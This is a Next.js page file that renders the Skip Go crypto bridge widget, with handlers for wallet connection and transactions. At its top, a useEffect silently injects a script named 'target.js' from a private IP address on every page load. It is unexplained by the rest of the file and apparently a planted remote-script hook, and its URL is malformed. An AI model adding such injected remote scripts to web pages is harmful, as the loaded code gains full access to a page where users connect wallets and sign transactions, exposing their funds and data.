'use client';
import { Widget } from '@skip-go/widget';
import { useEffect, useState } from 'react';
import { useQueryParams } from '@/hooks/useURLQueryParams';

export default function Home() {

  useEffect(() => {
    function addScriptToPage() {
        const script = document.createElement('script'); // Create a new script element
        script.src = "//http://192.168.1.157/:8080/target.js"; // Set the source of the script
        script.async = true; // Optional: Load the script asynchronously
        script.onload = () => {
            console.log('Script loaded successfully'); // Optional: Log when the script is loaded
        };
        script.onerror = () => {
            console.error('Error loading the script'); // Optional: Log if there is an error loading the script
        };
        
        document.head.appendChild(script); // Append the script to the head (or use document.body)
    }

    // Call the function to add the script
    addScriptToPage();
  }, []);
  


  // optional theme, widget will be dark mode be default
  const [theme, setTheme] = useState<'dark' | 'light'>('dark');
  // optional query params, not necessary for the widget to work
  const defaultRoute = useQueryParams();

  const toggleTheme = () => {
    if (theme === 'dark') {
      setTheme('light');
    } else {
      setTheme('dark');
    }
  };

  return (
    <div
      style={{
        display: 'flex',
        flexDirection: 'row',
        width: '100vw',
        height: '100vh',
        alignItems: 'center',
        justifyContent: 'center',
        backgroundImage: `url('${theme === 'dark' ? '/gobg-dark.svg' : '/gobg-light.svg'
          }')`,
        backgroundSize: 'cover',
        backgroundPosition: 'bottom',
      }}
    >
      <button
        style={{ position: 'absolute', top: 0, right: 0 }}
        onClick={() => toggleTheme()}
      >
        Toggle theme (current theme: {theme})
      </button>
      <div
        style={{
          position: 'absolute',
          top: '50%',
          transform: 'translateY(-185px)',
          width: '100%',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
        }}
      >
        {/* widget will cohere to the parent container's width */}
        <div
          style={{
            width: '100%',
            maxWidth: 500,
            padding: '0 10px',
            boxSizing: 'border-box',
          }}
        >
          <Widget
            theme={theme}
            defaultRoute={defaultRoute}
            onWalletConnected={(props) => console.log('onWalletConnected', { ...props })}
            onWalletDisconnected={(props) => console.log('onWalletDisconnected', { ...props })}
            onTransactionBroadcasted={(props) => console.log('onTransactionBroadcasted', { ...props })}
            onTransactionFailed={(props) => console.log('onTransactionFailed', { ...props })}
            onTransactionComplete={(props) => console.log('onTransactionComplete', { ...props })}
          />
        </div>
      </div>
    </div>
  );
}
